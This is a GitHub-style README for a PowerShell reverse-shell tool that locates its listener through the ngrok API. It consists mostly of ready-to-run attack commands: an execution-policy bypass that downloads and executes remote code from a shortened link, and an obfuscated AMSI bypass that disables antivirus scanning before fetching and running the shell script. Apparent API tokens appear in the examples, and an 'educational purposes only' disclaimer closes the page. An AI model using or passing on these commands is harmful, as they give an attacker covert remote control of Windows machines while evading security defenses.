## Video:
[![2022-05-12-20:38:15.png]([https://raw.githubusercontent.com/halitAKAYDIN/LfiScan/main/2022-05-12-20%3A38%3A15.png](https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/2022-06-01-18%3A57%3A38.png))](https://youtu.be/ "Test")

## Description
```
Auto detect remote server using ngrok api
```

## Requirements:
```
Ngrok
Netcat
```

## Example (Module):
```powershell
C:\PS> Import-Module .\Invoke-RevShell
C:\PS> Invoke-RevShell -api 29yl5EiFZzgT0Atb31Gi15TERuT_6SRPezQnv1kT2WLo5b1Mr
```

## Example (Default):

```powershell
C:\PS> powershell -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol=Net.SecurityProtocolType]::Tls12;
                                  IEX(New-Object Net.WebClient).downloadString('https://bit.ly/3N8EZjb'); 
                                  Invoke-RevShell -api 29yl5EiFZzgT0Atb31Gi15TERuT_6SRPezQnv1kT2WLo5b1Mr;"
```

## Example (Amsi Bypass):

```powershell
C:\PS> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);
C:\PS> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;
C:\PS> IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/Invoke-RevShell.ps1'); 
C:\PS> Invoke-RevShell -api 29yq9XSYB6rbCwWUVZJENMjGFmG_tVLYBw5qyLRfqMVxDe5M;
```



## Disclaimer:

```
This tool is for educational purposes only.
We are not responsible for any illegal usage of this tool.
```
